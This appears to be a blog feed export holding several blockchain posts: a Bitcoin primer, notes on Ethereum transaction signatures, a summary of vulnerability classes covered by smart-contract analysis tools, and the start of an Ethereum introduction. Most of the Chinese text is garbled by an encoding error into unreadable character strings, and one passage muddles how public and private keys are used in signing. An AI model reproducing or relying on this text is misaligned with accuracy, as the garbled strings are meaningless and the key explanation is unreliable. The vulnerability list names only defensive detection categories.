        <content type="html"><![CDATA[<h1 id="åŒºå—é“¾å…¥é—¨">åŒºå—é“¾å…¥é—¨</h1><h2 id="å†å²ä¸å±•æœ›">å†å²ä¸å±•æœ›</h2><h3 id="å†å²">å†å²</h3><p>å¯†ç æœ‹å…‹ï¼ˆCyberpunkï¼‰ä¸€ä¸ªå´‡å°šæ•°å­¦ã€å¯†ç å­¦ã€è®¡ç®—æœºæŠ€æœ¯ç­‰çš„å°ç»„ã€‚</p><p>ç®€ä»‹ï¼š <ahref="https://zhuanlan.zhihu.com/p/47079845">å¯†ç æœ‹å…‹æ˜¯ä»€ä¹ˆï¼Ÿ</a> <ahref="https://www.huxiu.com/article/269132.html">å¯†ç æœ‹å…‹æ¶ˆäº¡å²</a></p><p>æ¯”ç‰¹å¸çš„è¯ç”Ÿç¦»ä¸å¼€å‰äººä¼—å¤šæŠ€æœ¯æ”¯æŒï¼Œå¦‚: POW,æ—¶é—´æˆ³æ–¹æ³•ä¿è¯æ•°å­—æ–‡ä»¶å®‰å…¨çš„åè®®ã€ç‚¹å¯¹ç‚¹äº¤æ˜“ã€åŠ å¯†è´§å¸ç­‰ã€‚åŒæ ·ï¼ŒåŒºå—é“¾ä¸æ˜¯ä¸€ä¸ªå•ä¸€çš„æŠ€æœ¯ï¼Œè€Œæ˜¯ä¸€äº›æŠ€æœ¯çš„é›†åˆã€‚</p><h3 id="å‰æ™¯">å‰æ™¯</h3><p>åº”ç”¨åœºæ™¯ï¼š</p><ol type="1"><li>èµ„äº§ï¼šæ•°å­—èµ„äº§å‘è¡Œã€æ”¯ä»˜ï¼ˆè·¨å¢ƒæ”¯ä»˜ï¼‰ã€äº¤æ˜“ã€ç»“ç®—</li><li>è®°è´¦ï¼šè‚¡æƒäº¤æ˜“ã€ä¾›åº”é“¾é‡‘èã€å•†ä¸šç§¯åˆ†ã€</li><li>ä¸å¯ç¯¡æ”¹ï¼šæº¯æºã€ä¼—ç­¹ã€åŒ»ç–—è¯æ˜ã€å­˜åœ¨æ€§è¯æ˜</li><li>ç‚¹å¯¹ç‚¹ï¼šå…±äº«ç»æµã€ç‰©è”ç½‘</li><li>éšç§ï¼šåŒ¿åäº¤æ˜“ï¼Œ</li></ol><h2 id="æ¯”ç‰¹å¸ç®€ä»‹">æ¯”ç‰¹å¸ç®€ä»‹</h2><ol type="1"><li>æ¯”ç‰¹å¸æ˜¯æ•°å­—è´§å¸ä¼˜ç‚¹ï¼šè´¢äº§åªå—è‡ªå·±æ§åˆ¶ã€å®‰å…¨ã€æ— é€šèƒ€ã€æ²¡æœ‰å‡é’ã€æµé€šæ€§å¥½ã€åŒ¿åç¼ºç‚¹ï¼š</li><li>å»ä¸­å¿ƒåŒ–è®°è´¦ç³»ç»Ÿ</li></ol><h2 id="åˆ†ç±»">åˆ†ç±»</h2><p>åŒºå—é“¾åˆ†ä¸ºåŒºå—é“¾å…¬é“¾ã€ç§é“¾ã€è”ç›Ÿé“¾ã€ä¾§é“¾ï¼Œç‰¹ç‚¹æœ‰å“ªäº›, å‚è€ƒ: <ahref="https://zhuanlan.zhihu.com/p/36309354">ä»€ä¹ˆæ˜¯åŒºå—é“¾å…¬é“¾ã€ç§é“¾ã€è”ç›Ÿé“¾ã€ä¾§é“¾ã€‚</a><ahref="http://sudobash.cn/post/blockchain/2018/03/blockchain/kinds-of-blockchain.html">åŒºå—é“¾ï¼Œç§é“¾ï¼Œå…¬é“¾ï¼Œè”ç›Ÿé“¾ä¹‹æˆ‘è§</a><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203271585321442991.png"alt="åŒºå—é“¾(å…¬é“¾)å‘å±•å²" /></p><p>åŒºå—é“¾ 1.0, 2.0 çš„ TPSå‡ºå—é€Ÿåº¦æ…¢ï¼Œè€Œä¸”ä¸çŸ¥é“è¦ç­‰å¤šä¹…ã€‚å› æ­¤å‡ºç°äº†åŒºå—é“¾ 3.0çš„æƒ³æ³•ï¼Œæƒ³è¦é«˜æ€§èƒ½ï¼Œå¤§ååé‡ã€‚ åŒºå—é“¾ 3.0ï¼Œ å½“å‰çš„ EOSæ€§èƒ½æé«˜äº†ï¼Œä½†æ˜¯æ˜¯ä»¥ç‰ºç‰²äº†éƒ¨åˆ†å»ä¸­å¿ƒåŒ–çš„ç‰¹ç‚¹æ¥å®ç°çš„ã€‚å®ƒæœ‰ 21ä¸ªè¶…çº§èŠ‚ç‚¹ã€‚</p><h2 id="æ¯”ç‰¹å¸åŸç†">æ¯”ç‰¹å¸åŸç†</h2><h3 id="è´¦æœ¬éªŒè¯">è´¦æœ¬éªŒè¯</h3><p>é€šè¿‡å°†æ•´ä¸ªè´¦æœ¬è¿›è¡Œ hashï¼Œç„¶åå¯¹æ¯”åˆ†å¸ƒå¼ä¸åŒæœºå™¨ä¸­çš„ hashå€¼æ˜¯å¦ä¸€è‡´ï¼Œé‡‡ç”¨å°‘æ•°æœä»å¤šæ•°åŸåˆ™ã€‚ <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200503151249.png"alt="Ledger hash" /></p><p>ä¸€ä¸ªåŒºå—: åºå·ã€æ—¶é—´æˆ³ã€è´¦æœ¬çš„ hash å€¼ã€äº¤æ˜“è®°å½• <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200503151531.png"alt="block" /></p><p>æ–°è´¦æœ¬çš„äº§ç”Ÿï¼š</p><p>æ¯”ç‰¹å¸æ¯ 10 åˆ†é’Ÿè®°è´¦ä¸€æ¬¡ï¼Œé€šè¿‡å°†æ—§è´¦æœ¬çš„ hash å€¼å’Œæ–°æ·»åŠ äº¤æ˜“è®°å½•ä¸€èµ·hashï¼Œå½¢æˆæ–°çš„è´¦æœ¬çš„ hashã€‚ <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200503151839.png"alt="new ledger" /></p><p>æ¯ä¸ªèŠ‚ç‚¹åœ¨æ ¸å¯¹çš„æ—¶å€™ï¼Œåªéœ€è¦æ ¸å¯¹æœ€åä¸€ä¸ªåŒºå—çš„æ‘˜è¦ä¿¡æ¯ï¼Œå¦‚æœå®ƒæ­£ç¡®ï¼Œé‚£è¯´æ˜å‰é¢çš„ä¹Ÿæ­£ç¡®ã€‚</p><h3 id="è´¦æˆ·æ‰€æœ‰æƒé—®é¢˜">è´¦æˆ·æ‰€æœ‰æƒé—®é¢˜</h3><p>è´¦æˆ·ç”¨åœ°å€ä¿å­˜ï¼Œè½¬è´¦çš„è¿‡ç¨‹æ˜¯å°†æ¯”ç‰¹å¸ä»ä¸€ä¸ªåœ°å€è½¬ç§»åˆ°å¦ä¸€ä¸ªåœ°å€ã€‚è´¦æœ¬ä¸Šæ˜¯ä¸ä¿å­˜ä»»ä½•ä¸ªäººä¿¡æ¯çš„ã€‚</p><p>ä¸€æ¡è½¬è´¦è®°å½•</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ä»˜æ¬¾åœ°å€&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ä¸€ä¸²ä»˜æ¬¾æ•°å­—åœ°å€ç”¨æ¥ä»˜æ¬¾&quot;</span>ï¼Œ</span><br><span class="line">    <span class="attr">&quot;æ”¶æ¬¾åœ°å€&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ä¸€ä¸²æ•°å­—åœ°å€ç”¨æ¥æ”¶æ¬¾&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;é‡‘é¢&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2btc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ç§é’¥">ç§é’¥</h4><p>æ¯”ç‰¹å¸ä¸­ä¸€ä¸ªåœ°å€å¯¹åº”æœ‰ä¸€ä¸ªç§é’¥,æ‹¥æœ‰ç§é’¥æ‰å¯ä»¥ç™»å½•è¯¥è´¦æˆ·åœ°å€ï¼Œè¿›è¡Œè½¬è´¦ä»˜æ¬¾ç­‰ã€‚ä¸€ä½†ç§é’¥æ³„éœ²ï¼Œæ¯”ç‰¹å¸å°±æœ‰å¯èƒ½ä¼šä¸¢å¤±ã€‚</p><p>å…¬é’¥ã€ç§é’¥ã€åœ°å€çš„å…³ç³»:</p><ol type="1"><li>ç§é’¥ï¼šå®é™…ä¸Šæ˜¯ä¸€ç»„éšæœºæ•°ï¼Œå…³äºåŒºå—é“¾ä¸­çš„éšæœºæ•°æˆ‘ä»¬å·²ç»ä»‹ç»è¿‡äº†</li><li>å…¬é’¥ï¼šå¯¹ç§é’¥è¿›è¡Œæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ç”Ÿæˆï¼Œä½†æ˜¯æ— æ³•é€šè¿‡å…¬é’¥å€’æ¨å¾—åˆ°ç§é’¥ã€‚å…¬é’¥çš„ä½œç”¨æ˜¯åœ¨å’Œå¯¹æ–¹äº¤æ˜“æ—¶ï¼Œä½¿ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†ä¿¡æ¯ï¼Œç„¶åå¯¹æ–¹ä½¿ç”¨è‡ªå·±çš„å…¬é’¥è§£å¯†è·å¾—åŸå§‹ä¿¡æ¯ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¿—ç§°ç­¾åã€‚</li><li>åœ°å€ï¼šç”±äºå…¬é’¥å¤ªé•¿ï¼Œåœ¨äº¤æ˜“ä¸­ä¸æ–¹ä¾¿ä½¿ç”¨ï¼Œå°±å¯¹å…¬é’¥å“ˆå¸Œè¿›è¡ŒSHA256ã€RIPEMD160ã€Base58 ç®—æ³•åŠ å¯†ç”Ÿæˆåœ°å€</li></ol><p>æ€»ç»“ï¼Œç§é’¥-&gt;å…¬é’¥-&gt;åœ°å€</p><h4 id="ç­¾åä¸éªŒè¯">ç­¾åä¸éªŒè¯</h4><p>é‡‡ç”¨éå¯¹ç§°åŠ å¯†æŠ€æœ¯ï¼Œé€šè¿‡ç­¾åéªŒè¯æ¥è¯æ˜è´¦æˆ·æ‰€æœ‰æƒï¼ˆä¹Ÿå°±æ˜¯åœ¨ä¸æ³„éœ²ç§é’¥çš„æƒ…å†µä¸‹ï¼Œè¯æ˜æ‹¥æœ‰ç§é’¥ï¼‰</p><ol type="1"><li><p>ç­¾åï¼ˆåŠ å¯†ï¼‰</p><ol type="1"><li><p>å¯¹äº¤æ˜“è¿›è¡Œ hash å¾—åˆ°æ‘˜è¦ <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020531588500902676.png"alt="transaction hash" /></p></li><li><p>ç”¨äº¤æ˜“çš„ hash æ‘˜è¦å’Œç§é’¥è¿›è¡Œç­¾å <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020531588500983010.png"alt="sign" /></p></li></ol></li><li><p>å¹¿æ’­äº¤æ˜“å‘å‘¨å›´èŠ‚ç‚¹å¹¿æ’­äº¤æ˜“å’Œç­¾åï¼Œå‘¨å›´èŠ‚ç‚¹æ”¶åˆ°åå†æ¬¡å‘å¤–å¹¿æ’­</p></li><li><p>éªŒè¯ï¼ˆè§£å¯†ï¼‰ ç­¾åéªŒè¯çš„ç›®çš„æœ‰ä¸¤ä¸ªï¼š</p><ol type="1"><li>è¯æ˜äº¤æ˜“æ‰€å¼•ç”¨çš„ UTXO çš„ç¡®å±äºä»˜æ¬¾äººã€‚ å…·ä½“åˆ°æœ¬æ¬¡äº¤æ˜“ï¼Œå°±æ˜¯è¯æ˜äº¤æ˜“001 çš„åºå·ä¸º 0 çš„ UTXO çš„ç¡®æ˜¯å‘ç»™ B çš„ã€‚ æ–¹æ³•ï¼š- [ ] æš‚æ—¶ä¸å†™</li><li>è¯æ˜äº¤æ˜“çš„æ‰€æœ‰æ•°æ®çš„ç¡®æ˜¯ä»˜æ¬¾äººæä¾›çš„ï¼Œä¸”æœªè¢«ä¿®æ”¹è¿‡ã€‚å…·ä½“åˆ°æœ¬æ¬¡äº¤æ˜“ï¼Œå°±æ˜¯è¯æ˜ B çš„ç¡®åˆ›å»ºäº†äº¤æ˜“002ï¼Œä¸”äº¤æ˜“å†…çš„æ•°æ®æœªè¢«ä¿®æ”¹è¿‡ã€‚æ–¹æ³•:ä½¿ç”¨ç­¾åå’Œä»˜æ¬¾æ–¹åœ°å€è¿›è¡ŒéªŒè¯æ“ä½œï¼Œå¦‚æœç»“æœä¸ºäº¤æ˜“çš„æ‘˜è¦ï¼ŒéªŒè¯é€šè¿‡<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020531588502263289.png"alt="verity" /></li></ol></li></ol><h2 id="è®°è´¦æŒ–çŸ¿">è®°è´¦(æŒ–çŸ¿)</h2><p>è®°è´¦: Hashæ‰“åŒ…çš„è¿‡ç¨‹ï¼Œè¯¥è¿‡ç¨‹åˆè¢«ç§°ä¸ºæŒ–çŸ¿ï¼Œé€šè¿‡æ¶ˆè€—ç®—åŠ›æ‰“åŒ…åŒºå—ï¼Œè·å–ä¸€å®šçš„å¥–åŠ±</p><h3 id="è§„åˆ™">è§„åˆ™</h3><ol type="1"><li>ä¸€æ®µæ—¶é—´å†…åªæœ‰ä¸€äººå¯ä»¥è®°è´¦æˆåŠŸ</li><li>é€šè¿‡è§£å†³å¯†ç å­¦éš¾é¢˜ï¼ˆå³å·¥ä½œé‡è¯æ˜ï¼‰ç«äº‰è·å¾—å”¯ä¸€è®°è´¦æƒ</li><li>å…¶ä»–èŠ‚ç‚¹å¤åˆ¶è®°è´¦ç»“æœ</li></ol><h3 id="å·¥ä½œé‡è¯æ˜">å·¥ä½œé‡è¯æ˜</h3><p>å¦‚æœæŒ‰ç…§éœ€è¦æ‰“åŒ…çš„è¯ï¼Œåªéœ€è¦è®¡ç®— Hashï¼ˆä¸Šä¸€ä¸ª Hash å€¼ï¼Œäº¤æ˜“è®°å½•é›†ï¼‰çš„hashå€¼å³å¯ã€‚ä½†æ˜¯ä¸ºäº†å‡ºå—æ—¶é—´çš„ç¨³å®šï¼Œå°±å¿…é¡»æé«˜è®¡ç®—çš„éš¾åº¦ï¼Œå› æ­¤æ¯”ç‰¹å¸é‡‡å–åŠ å…¥éšæœºå€¼ï¼Œè¦æ±‚ç»“æœhash å€¼ä»¥ n ä¸ª 0 å¼€å¤´<code>Hashï¼ˆä¸Šä¸€ä¸ªHashå€¼ï¼Œäº¤æ˜“è®°å½•é›†ï¼Œéšæœºæ•°ï¼‰= 00eeaFD635BCD</code>,å› æ­¤ï¼ŒæŒ–çŸ¿çš„è¿‡ç¨‹å°±æ˜¯ä¸æ–­éå†éšæœºæ•°ï¼Œå¯»æ‰¾ç¬¦åˆå‰ n ä¸ªæ•°ä¸º 0 çš„ç»“æœ hashå€¼çš„è¿‡ç¨‹</p><h4 id="äº¤æ˜“è®°å½•é›†">äº¤æ˜“è®°å½•é›†</h4><ol type="1"><li>æ”¶é›†å¹¿æ’­ä¸­è¿˜æ²¡æœ‰è¢«è®°å½•è´¦æœ¬çš„äº¤æ˜“</li><li>äº¤æ˜“çš„æœ‰æ•ˆæ€§éªŒè¯ï¼ˆä¸¤ä¸ªæ–¹é¢ï¼‰</li><li>æ·»åŠ ä¸€ç¬”ç»™è‡ªå·±è½¬è´¦çš„äº¤æ˜“ï¼ˆæŒ–çŸ¿å¥–åŠ±ï¼‰</li></ol><h3 id="å…±è¯†æœºåˆ¶">å…±è¯†æœºåˆ¶</h3><p>ä¸¤ä¸ªèŠ‚ç‚¹åŒæ—¶å®Œæˆå·¥ä½œé‡è¯æ˜ï¼Œä½¿ç”¨è°çš„åŒºå—ï¼Ÿ</p><p>ä¸ºä»€ä¹ˆè¦éµå®ˆåè®®ï¼Ÿ èŠ‚ç‚¹å·¥ä½œé‡åªæœ‰åœ¨å…¶ä»–çš„èŠ‚ç‚¹è®¤åŒå…¶æ˜¯æœ‰æ•ˆçš„</p><p>POW ç´¯è®¡å·¥ä½œé‡æœ€å¤§çš„åŒºå—é“¾</p><p>æ¯”ç‰¹å¸é‡‡ç”¨çš„å…±è¯†ç®—æ³•å°±æ˜¯ POWï¼ŒçŸ¿å·¥ä»¬åœ¨æŒ–ä¸€ä¸ªæ–°çš„åŒºå—æ—¶ï¼Œå¿…é¡»å¯¹SHA-256 å¯†ç æ•£åˆ—å‡½æ•°è¿›è¡Œè¿ç®—ï¼ŒåŒºå—ä¸­çš„éšæœºæ•£åˆ—å€¼ä»¥ä¸€ä¸ªæˆ–å¤šä¸ª 0å¼€å§‹ã€‚éšç€ 0æ•°ç›®çš„ä¸Šå‡ï¼Œæ‰¾åˆ°è¿™ä¸ªè§£æ‰€éœ€è¦çš„å·¥ä½œé‡å°†å‘ˆæŒ‡æ•°å¢é•¿ï¼ŒçŸ¿å·¥é€šè¿‡åå¤å°è¯•æ‰¾åˆ°è¿™ä¸ªè§£ã€‚</p><p>æ¯ä¸ªèŠ‚ç‚¹æ ¹æ®æ€»æ˜¯ç‹¬ç«‹åœ°å»é€‰æ‹©æœ€é•¿çš„ï¼ˆå·¥ä½œé‡æœ€å¤§çš„é‚£æ¡é“¾)</p><p>å‚è€ƒèµ„æ–™: <ahref="https://zhuanlan.zhihu.com/p/31882881">æ¯”ç‰¹å¸é’±åŒ…çš„ç†è§£ï¼ˆä¸€ï¼‰ç§é’¥ã€å¯†ç ã€åŠ©è®°è¯</a><ahref="http://www.jouypub.com/2018/7fa3a59868f7c62ec77a02a887c1bae0/">åŒºå—é“¾ä¹‹å…¬é’¥ã€ç§é’¥ã€åœ°å€ä¹‹é—´çš„å…³ç³»</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Blockchain Transactions</title>
      <link href="/blog/2021/03/30/blockchain/2.Transactions/"/>
      <url>/blog/2021/03/30/blockchain/2.Transactions/</url>
      
        <content type="html"><![CDATA[<h1 id="transactions">Transactions</h1><p>How ethereum transaction work and how the ethereum blockchain makesure the transaction is authentic.</p><p><code>sendTransaction</code> å‡½æ•°ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ä¸ªå‚æ•°ï¼š</p><ol type="1"><li><code>from: [account]</code></li><li><code>to: [account](optional)</code></li><li><code>value:[integer] in wei</code></li><li>gas:maximum amount of gas used</li><li>gasPrice:amount of wei per gas</li><li>data: ABI Byte string(optional)</li><li>nonce: Integer of a nonceï¼Œin order to avoid replay attacks</li></ol><p>ä¾‹å¦‚ï¼š<ahref="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#sendtransaction">sendTransactionof web3.js</a></p><h2 id="signature">Signature</h2><ul><li>Transaction Signatures ensure authenticity of transactions</li><li>Signatures are generated from Private Keys</li></ul><p><ahref="https://web3js.readthedocs.io/en/v1.2.11/web3-eth-accounts.html#signtransaction">signTransactionof web3.js</a></p><p>ä¸‰ä¸ªå‚æ•°ï¼šv,r,s ä¸ºç­¾å. With these three parameter, we canauthenticate the transaction isn't from malicious actor</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16171092613915.jpg"alt="16171092613915" /><figcaption aria-hidden="true">16171092613915</figcaption></figure><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16450841359407.jpg"alt="16450841359407" /><figcaption aria-hidden="true">16450841359407</figcaption></figure><p>æ­¥éª¤ï¼š</p><ol type="1"><li>é¦–å…ˆï¼Œæˆ‘ä»¬é€šè¿‡ MetaMask åˆ›å»ºäº¤æ˜“ï¼Œfrom A to Bï¼Œvalue=c</li><li>MetaMask å­˜å‚¨å‘é€æ–¹è´¦æˆ·çš„ç§é’¥ï¼ˆç§é’¥ï¼Œ32 bytes=64 hexcharactersï¼‰</li><li>é€šè¿‡ ECDSA ç®—æ³•ï¼ˆElliptic Curve Digital SignatureAlgorithmï¼‰ï¼Œå¾—å‡ºå…¬é’¥</li><li>é€šè¿‡å–ç»è¿‡ Keccak ç®—æ³•å¤„ç†çš„å…¬é’¥çš„å 20 å­—èŠ‚ï¼Œä½œä¸ºè´¦æˆ·åœ°å€</li><li>é€šè¿‡ç§é’¥å¯¹äº¤æ˜“è¿›è¡Œç­¾åï¼Œäº§ç”Ÿ vï¼Œrï¼Œs ä¸‰ä¸ªé‡è¦å‚æ•°</li><li>é€šè¿‡ vï¼Œrï¼Œs åˆ©ç”¨ ECRECOVER éªŒè¯ç­¾åï¼ˆé€šè¿‡ ecrecoverå‡½æ•°ä¸ç­¾åå¯ä»¥å¾—å‡ºç­¾åè€…çš„å…¬é’¥ï¼Œè¿›è€Œå¾—å‡ºç­¾åè€…çš„åœ°å€ï¼Œæœ€ç»ˆå¯¹æ¯”æ˜¯å¦ä¸å£°ç§°çš„ç­¾ååœ°å€ä¸€è‡´ï¼‰</li></ol><p>Public Keys and Addresses are generated from Private Keys. PrivateKeys have to be kept save under all circumstances</p><p><a href="https://zhuanlan.zhihu.com/p/121039362">UTXOè®²è§£-æ¯”ç‰¹å¸äº¤æ˜“åº•å±‚æŠ€æœ¯è¯¦è§£ - çŸ¥ä¹</a></p><p><ahref="https://btc.com/btc/transaction/4a5e1e4baab89f3a32518a88c31bc87f618f76673e2cc77ab2127b7afdeda33b">ä¸­æœ¬èªåˆ›ä¸–é“¸å¸äº¤æ˜“-BitcoinCoinBase Tx</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦æ¼æ´æ£€æµ‹å·¥å…·æ¼æ´è¦†ç›–æ€»ç»“</title>
      <link href="/blog/2021/03/30/blockchain/eth_vulns/eth_detection_tools/"/>
      <url>/blog/2021/03/30/blockchain/eth_vulns/eth_detection_tools/</url>
      
        <content type="html"><![CDATA[<p>æ¼æ´åˆ†ç±»é‡‡ç”¨ <ahref="https://github.com/eth-sri/securify2">securify2</a> æ€»ç»“çš„ã€‚</p><h2 id="teether">TEETHER</h2><p>ç”±äºå®ƒçš„æ”»å‡»è€…æ¨¡å‹æ˜¯: å·ä»¥å¤ªå¸ï¼Œæ‰€ä»¥å°†æœ‰å…³è½¬è´¦å¿…ç”¨çš„æŒ‡ä»¤:å‡¡æ˜¯åˆçº¦ä¸­åŒ…å«æŒ‡ä»¤é›† CALLã€SELFDESTRUCTã€CALLCODEã€DELEGATECALLéƒ½è¢«è®¤ä¸ºæ˜¯è„†å¼±çš„åˆçº¦</p><p><ahref="https://clouddatalab.github.io/paper/2018/12/29/TEETHER-Gnawing-at-Ethereum-to-Automatically-Exploit-Smart-Contracts/">TEETHER:Gnawing at Ethereum to Automatically Exploit Smart Contracts</a></p><h2 id="smartcheck">SmartCheck</h2><ol type="1"><li><p><strong>Security</strong> issues lead to exploits by a malicioususer account or contract</p><p>Balance equality(2.1.1) Unchecked external call(2. 1.2) DoS byexternal contract(2.1.3 send instead of transfer(2.1.4)Reentrancy(2.1.5) Malicious libraries(2.1.6) USing tx origin(2.1.7)Transfer for wards gas(21.8)</p></li><li><p><strong>Functional</strong> issues cause the violation of theintended func tonality</p><p>Integer divIsion(2.2.1) Locked money(2.2.2) Unchecked math(2.2.3)---æº¢å‡º Timestamp dependence(2.2. 4) Unsafe type inference(2.2.5)--ç¼–ç è§„èŒƒ</p></li><li><p><strong>Operational</strong> issues lead to run-time problems, e.g, bad per formance</p><p>Byte array Costly loop -- dos loop gas limit</p></li><li><p><strong>Developmental</strong> issues make code difficult tounderstand Improve</p><p>Token api violation Compiler version not fixed private modIfierRedundant fallback function Style guide violation Implicit visibilitylevel</p></li></ol><p>We differentiate between functional and security issues: the formerpose problems even without an adversaryï¼ˆthough an external maliciousactor can aggravate the situation), while the latter do not.</p><p>è®ºæ–‡ ç¬¬äº”é¡µ table 1</p><h2 id="sfuzz">sFUZZ</h2><p>æ£€æµ‹çš„æ¼æ´:</p><p>Gasless send Exception Disorder Reentrancy Timestamp Dependency BlockNumber Dependency Dangerous Delegate call Integer Overflow IntegerUnderflow Freezing ether</p><h2 id="ethploit">ETHPLOIT</h2><p>p2 é¡µ</p><p>Vulnerabilities of smart contract platforms could happen at theblockchain level, EVM level, and contract level We focus thecontract-level vulnerabilities.</p><ol type="1"><li>Balance Incrementï¼ˆåˆçº¦å¯ä»¥å‘ä»»æ„è´¦æˆ·å‘é€ etherï¼‰</li><li>Self-destruction.</li><li>Code Injection(ä»å¤–éƒ¨åˆçº¦å¼•å…¥æ¶æ„ä»£ç )</li></ol><ol type="1"><li>Unchecked Transfer Value</li><li>Vulnerable Access Control</li><li>Exposed Secret(è®ºæ–‡æ–°æå‡ºçš„)</li></ol><h2 id="gasfuzz">GasFuzz</h2><p>DoS With Block Gas Limit/ Out-of-Gas Vulnerability</p><h2 id="gasper">GASPER</h2><p>GAS-costly Patterns checker</p><p>3 representative patterns in 2 categories</p><p>Two categories: useless-code related patterns and loop-relatedpatterns. ä¸€ã€Category 1: Useless-code related Patterns</p><ol type="1"><li>Dead code</li><li>Opaque predicate</li></ol><p>äºŒã€Category 2: Loop-related Patterns</p><ol type="1"><li>Expensive operations in a loop</li><li>Constant outcome of a loop</li><li>Loop fusion</li><li>Repeated computations in a loop</li><li>Comparison with unilateral outcome in a loop</li></ol><h2 id="madmax">MadMax</h2><p>gas-focused vulnerabilities:</p><ol type="1"><li><p>Unbounded Mass Operationsï¼ˆin loopsï¼‰</p><p>ç”±ç”¨æˆ·è¾“å…¥å†³å®šè¡Œä¸ºçš„å¾ªç¯ï¼Œå¯èƒ½ä¼šè¿­ä»£è¿‡å¤šæ¬¡ï¼Œæ¶ˆè€— gas</p></li><li><p>Non-Isolated External Calls (Wallet Griefing)</p><p>invoking external functionality: implicit code invocation at an Ethertransfer, handling multiple clients without isolation, and standardpractices for aborting on a send failure.</p></li><li><p>Integer Overflows</p><p>ç‰¹å®šæƒ…å†µä¸‹çš„æ•´å½¢æº¢å‡ºï¼Œä¾‹å¦‚: å¾ªç¯ï¼Œè¾¹ç•Œæº¢å‡ºå¯¼è‡´æ— ç»ˆæ­¢ï¼Œgasæ¶ˆè€—</p></li></ol><p>1 å’Œ 2 æ˜¯ DoS With Block Gas Limit/ Out-of-Gas Vulnerability çš„ 2ç§å…·ä½“åˆ†ç±»</p><h2 id="vandal">Vandal</h2><ol type="1"><li><p>Unchecked Send</p></li><li><p>Reentrancy</p></li><li><p>Unsecured Balance / Incorrect Constructor Name</p><p>Solidity version 0.4.22 ä»¥ä¸Šï¼Œå¦‚æœæ­£ç¡®ç¼–ç ï¼Œå¯ä»¥æœç»ã€‚</p></li><li><p>Destroyable contracts</p><p>selfdestruct å‡½æ•°ï¼Œè®¤è¯ä¸è¶³ï¼Œå¯è¢«ä»»æ„è°ƒç”¨</p></li><li><p>Origin vulnerabilities</p><p>ä½¿ç”¨ tx.origin è®¤è¯</p></li></ol><h1 id="ethainter">Ethainter</h1><ol type="1"><li>accessible selfdestruct</li><li>tainted selfdestruct</li><li>tainted owner variable</li><li>unchecked tainted staticcall</li><li>tainted delegatecall</li></ol><h2 id="ç›®å‰çœ‹åˆ°çš„å‡ ç§åˆ†ç±»">ç›®å‰çœ‹åˆ°çš„å‡ ç§åˆ†ç±»</h2><ol start="2" type="1"><li>SmartCheck çš„åˆ†ç±»</li><li><ahref="https://www.chainnode.com/post/397677">æœ€å…¨æ•´ç†|æ™ºèƒ½åˆçº¦å®¡è®¡å·¥å…·æ£€æµ‹å†…å®¹æœ‰å“ªäº›ï¼Ÿ</a></li><li><ahref="https://consensys.github.io/smart-contract-best-practices/known_attacks/#reentrancy">consensysKnown Attacks</a></li><li><a href="https://mythx.io/detectors/">MythX detectors</a></li><li><a href="https://github.com/smartdec/classification">Classificationof smart contract vulnerabilities</a></li><li><ahref="https://github.com/sigp/solidity-security-blog">solidity-security-blog</a></li><li><a href="https://arxiv.org/pdf/1908.04507.pdf">A Survey on EthereumSystems Security: Vulnerabilities, Attacks and Defenses</a></li></ol><p><a href="https://tool.smartdec.net/knowledge">smartcheckæ¼æ´åˆ—è¡¨</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»¥å¤ªåŠå…¥é—¨</title>
      <link href="/blog/2021/03/30/blockchain/ethereum/1.ethereum/"/>
      <url>/blog/2021/03/30/blockchain/ethereum/1.ethereum/</url>
      
        <content type="html"><![CDATA[<h1 id="ethereum">Ethereum</h1><h2 id="introduction">introduction</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/web3js_eth.png"alt="web3js_eth" /><figcaption aria-hidden="true">web3js_eth</figcaption></figure><p>There are a JavaScript library for developers which is web3.jsï¼Œassome kind of portal or window of Ethereum networkï¼Œcan be usedd to sendmoneyï¼Œstore dataï¼Œdeploy contracts or do essential what ever we want todo on the network</p><p>There are two options for consumers, which are Metamask(a broswerextension)ã€Mist Broswer(early beta)</p><h2 id="smart-contract">Smart Contract</h2><p>ä»¥å¤ªåŠçš„æ ¸å¿ƒæ˜¯æ™ºèƒ½åˆçº¦ï¼Œæ™ºèƒ½åˆçº¦å°±æ˜¯ä¸€æ®µå¯ä»¥é€šè¿‡äººæˆ–è€…å¦ä¸€ä¸ªåˆçº¦å‘é€æ¶ˆæ¯æ¥æ‰§è¡Œç‰¹å®šçš„æ“ä½œçš„ä»£ç ã€‚</p><p>ä»€ä¹ˆæ˜¯æ™ºèƒ½åˆçº¦ ä»¥å¤ªåŠä¸Šçš„ç¨‹åºï¼Œæ˜¯ä»£ç 